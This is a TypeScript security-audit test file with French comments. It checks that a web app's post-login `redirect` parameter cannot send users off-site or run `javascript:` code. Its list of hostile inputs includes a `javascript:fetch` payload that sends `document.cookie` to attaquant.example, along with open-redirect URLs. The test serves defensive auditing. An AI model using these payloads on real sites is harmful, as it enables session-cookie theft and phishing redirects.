/**
 * Audit de sécurité du module événements — AUD-17 : redirection après connexion non filtrée (redirection ouverte et
 * exécution de `javascript:` dans l'origine du site).
 *
 * app/login/page.tsx:22 lit `?redirect=` tel quel ; components/auth/LoginForm.tsx:301-304 fait
 * `window.location.href = resolvePostLoginRoute(roles, redirectUrl)` et :492 `window.location.href = redirectUrl || '/'` ;
 * lib/auth/resolve-post-login-route.ts:5 et :20 rendent la cible brute dès qu'elle n'est pas « / ». Une cible
 * `javascript:…` s'exécute donc dans la page du site, juste après la connexion, avec accès aux cookies de session
 * (@supabase/ssr, lisibles en JavaScript) ; une cible `https://…` ou `//…` envoie la victime, connectée, vers un site
 * tiers. La page d'inscription, elle, filtre (`safeInternalPath`, app/register/page.tsx:44-48, :148).
 *
 * Test ROUGE tant que la faille existe : la destination après connexion est toujours un chemin interne du site.
 */
import '../helpers/env';
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { resolvePostLoginRoute } from '../../lib/auth/resolve-post-login-route';

const HOSTILE = [
    'javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))',
    'JavaScript:alert(document.domain)',
    'https://attaquant.example/connexion',
    '//attaquant.example/connexion',
    '/\\attaquant.example',
];

function isInternalPath(target: string): boolean {
    return target.startsWith('/') && !target.startsWith('//') && !target.startsWith('/\\');
}

describe('AUD-17 — destination après connexion (paramètre redirect de /login)', () => {
    test('une destination hostile est remplacée par un chemin interne, quel que soit le rôle', () => {
        const results = HOSTILE.flatMap((raw) => [['CLIENT'], ['PARTENAIRE'], ['ADMIN']].map((roles) => ({
            raw, roles: roles.join(','), target: resolvePostLoginRoute(roles, raw),
        })));
        for (const r of results) console.log(`[AUD-17] rôles ${r.roles} ; redirect=${JSON.stringify(r.raw)} → ${JSON.stringify(r.target)}`);
        const unsafe = results.filter((r) => !isInternalPath(r.target));
        assert.deepEqual(unsafe.map((r) => `${r.roles} ${r.target}`), [],
            `${unsafe.length} destination(s) hostile(s) rendue(s) telles quelles et affectées à window.location.href par LoginForm`);
    });
});
